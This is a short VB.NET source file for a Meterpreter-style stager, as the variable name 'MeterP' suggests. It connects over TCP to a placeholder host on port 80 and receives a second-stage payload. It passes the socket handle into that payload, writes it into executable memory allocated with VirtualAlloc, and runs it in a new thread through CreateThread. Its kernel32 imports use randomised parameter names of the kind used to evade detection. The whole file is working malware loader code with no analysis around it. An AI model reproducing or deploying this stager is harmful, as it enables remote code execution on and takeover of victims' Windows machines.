
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Module Module1

    Sub Main()
        Dim MeterP As Byte() = Nothing
        MeterP = ConnecT("host", 80)
        INJECT(MeterP)
    End Sub






    Private Function ConnecT(HOST As String, PORT As Integer) As Byte()
        Dim IPo As New IPEndPoint(IPAddress.Parse(HOST), PORT)
        Dim Sock As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Try
            Sock.Connect(IPo)
        Catch
            Return Nothing
        End Try
        Dim TrfByte As Byte() = New Byte(3) {}
        Sock.Receive(TrfByte, 4, 0)
        Dim Tint32 As Integer = BitConverter.ToInt32(TrfByte, 0)
        Dim N32byte As Byte() = New Byte(Tint32 + 4) {}
        Dim RcvInt As Integer = 0
        While RcvInt < Tint32
            RcvInt += Sock.Receive(N32byte, RcvInt + 5, If((Tint32 - RcvInt) < 4096, (Tint32 - RcvInt), 4096), 0)
        End While
        Dim SckHandlByte As Byte() = BitConverter.GetBytes(CInt(Sock.Handle))
        Array.Copy(SckHandlByte, 0, N32byte, 1, 4)
        N32byte(0) = &HBF
        Return N32byte
    End Function
    Private Sub INJECT(RAW_BYTE As Byte())
        If RAW_BYTE IsNot Nothing Then
            Dim V_Allock As UInt32 = VirtualAlloc(0, CType(RAW_BYTE.Length, UInt32), &H1000, &H40)
            Marshal.Copy(RAW_BYTE, 0, CType(V_Allock, IntPtr), RAW_BYTE.Length)
            Dim Ptr_1 As IntPtr = IntPtr.Zero
            Dim A_32 As UInt32 = 0
            Dim BB32 As IntPtr = IntPtr.Zero
            Ptr_1 = CreateThread(0, 0, V_Allock, BB32, 0, A_32)
            WaitForSingleObject(Ptr_1, &HFFFFFFFFUI)
        End If
    End Sub

    <DllImport("kernel32")> _
    Private Function VirtualAlloc(NHEJZZZy As UInt32, ufWmAAhb As UInt32, tRLizNaKZHljpfV As UInt32, OgCLLvM As UInt32) As UInt32
    End Function
    <DllImport("kernel32")> _
    Private Function CreateThread(SlEcdpknQCZ As UInt32, loxVUMkDnCpf As UInt32, TQoGHP As UInt32, fEFdtpfgCwo As IntPtr, OsTHmJVaCqwUXnd As UInt32, ByRef ebSHaNBoyiU As UInt32) As IntPtr
    End Function
    <DllImport("kernel32")> _
    Private Function WaitForSingleObject(KpYiBT As IntPtr, PVMJFcaBhFS As UInt32) As UInt32
    End Function



End Module